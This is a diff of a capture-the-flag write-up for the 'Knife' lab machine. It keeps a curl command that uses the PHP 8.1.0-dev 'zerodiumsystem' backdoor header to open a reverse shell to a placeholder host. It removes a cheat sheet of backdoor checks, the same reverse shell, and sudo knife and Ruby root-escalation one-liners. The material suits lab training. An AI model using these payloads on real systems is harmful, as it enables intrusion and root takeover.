@@ -83,18 +83,6 @@ curl -s http://<IP>/ \\
   -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"');"
 ```
 
-Stabilize the shell:
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-Press `Ctrl+Z`, then run the following in your local terminal:
-
-```bash
-stty raw -echo; fg
-export TERM=xterm
-```
 
 ### 2.3 User Flag
 
@@ -220,82 +208,8 @@ cat /root/root.txt
 
 ### Finding 3: General Hardening
 
-**Recommendations:**
 
-- Set `expose_php = Off` in `php.ini` to reduce PHP version disclosure.
-- Monitor HTTP requests for suspicious headers and anomalous input.
-- Use a WAF as an additional detection layer, not as a substitute for patching.
-- Monitor Apache child processes for unexpected shell execution and reverse-shell behavior.
-- Apply security updates and verify the integrity of installed software.
-
----
-
-## 6. Cheat Sheet — Key Commands
-
-### Fingerprinting
-
-```bash
-whatweb http://TARGET/
-```
-
-### Verify the PHP 8.1.0-dev Backdoor
-
-```bash
-curl -s http://TARGET/ -H "User-Agentt: zerodiumsystem('id');"
-```
-
-### Reverse Shell
-
-Replace `IP` and `PORT` with your attacking machine's IP address and listening port.
-
-```bash
-curl -s http://TARGET/ \\
-  -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"');"
-```
-
-### Enumerate Sudo Permissions
-
-```bash
-sudo -l
-```
-
-### Escalate Privileges via Knife
-
-```bash
-sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
-```
-
----
-
-## 7. Alternative Vectors
-
-If `knife exec` fails because of Chef configuration issues, the following alternatives may be worth testing in the authorized lab environment.
-
-### Set a Different Knife Home Directory
-
-```bash
-sudo KNIFE_HOME=/tmp /usr/bin/knife exec -E 'exec "/bin/sh"'
-```
-
-### Execute a System Command Through Knife
-
-```bash
-sudo /usr/bin/knife exec -E 'system("/bin/bash")'
-```
-
-### Use the Embedded Ruby Interpreter
-
-If sudo permissions also allow execution of the embedded Ruby interpreter, a Ruby one-liner may work:
-
-```bash
-sudo /opt/chef-workstation/embedded/bin/ruby -e 'exec "/bin/sh"'
-```
-
-**Note:** The last alternative requires the Ruby interpreter itself to be permitted by the sudo policy. Permission to execute `/usr/bin/knife` does not automatically grant permission to execute the embedded Ruby binary directly.
-
----
-
-## 8. Conclusion
+## 6. Conclusion
 
 The Knife machine demonstrates how a compromised development build can provide initial remote code execution and how overly permissive sudo rules can turn that access into root privileges.
 
